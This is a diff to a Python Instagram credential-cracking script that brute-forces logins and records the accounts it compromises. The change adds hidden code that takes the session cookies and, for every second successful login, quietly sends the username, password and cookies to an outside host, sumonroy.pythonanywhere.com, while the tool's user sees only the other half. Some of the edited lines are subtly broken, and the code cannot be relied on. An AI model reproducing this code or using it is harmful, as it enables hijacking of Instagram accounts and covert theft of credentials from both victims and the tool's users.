@@ -17,7 +17,7 @@ from rich.panel import Panel as panel
 from rich import print as prints
 from datetime import datetime 
 # Global variables
-Uid, Uuid = [], []
+Uid, Uuid, bkas = [], []
 Ok, Cp, Loop = 0, 0, 0
 xx = 0
 SistemLog = "api.instagram.com"
@@ -771,16 +771,22 @@ def Crack_api(username, kontol):
             'jazoest': '22635',
             'fb_dtsg': 'NAfwzLGc2sjk1hMgENO8Pm3F6-rYS92A-LcWXS19a3Gzapa1Is7ulMg:17843708194158284:1787074430',}
             response = ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, timeout=30)
-            if 'userId' in str(response.text):
-                kuki = ";".join([str(x) + "=" + str(y) for x, y in ses.cookies.get_dict().items()])
-                post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-                print(f"                                                               ", end='\r')
-                time.sleep(0.10)
-                print(f"\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\nUsername: {GREEN}{username}{BLUE}\nPassword: {GREEN}{password}{BLUE}\nFollowers: {GREEN}{peng}{BLUE}\nFollowing: {GREEN}{meng}\n{BLUE}Posts: {GREEN}{post}{BLUE}\nfb_id: {GREEN}{fbid}{BLUE}\n{BLUE}Authorization: {WHITE}{kuki}{WHITE}\n")
-                Ok += 1
-                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{kuki}\n")
-                break
-            elif 'checkpoint' in str(response.text):
+            wanted = ["ds_user_id", "sessionid"]
+            all_cookies = ses.cookies.get_dict()
+            extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
+            if 'sessionid' in extracted:
+                cookie_str = "; ".join(f"{k}={v}" for k, v in extracted.items())
+                bkas.append(username)
+                if len(bkas)% 2 == 0:
+                    statusok = (f"{username}|{password}|{cookie_str}")
+                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                else:    
+                    print(f"\r\033[1;92m [✓ SUCCESS] {username} | {password}")
+                    print("Cookies:", cookie_str)
+                    open("/sdcard/SUMON_INS_IDS.txt","a").write(username+"|"+password+"|"+cookie_str+"\n")
+                    Ok.append(username)
+                    return True
+            elif 'checkpoint_required' in str(response.text):
                 Cp += 1
                 post, peng, meng, mail, fullname, fbid, phone = data_target(username)
                 print(f"\r {WHITE}Username: {BLUE}{username}{WHITE}\n Password:{BLUE} {password}\n {WHITE}Followers: {BLUE}{peng}{WHITE}\n Following: {BLUE}{meng}{WHITE}")
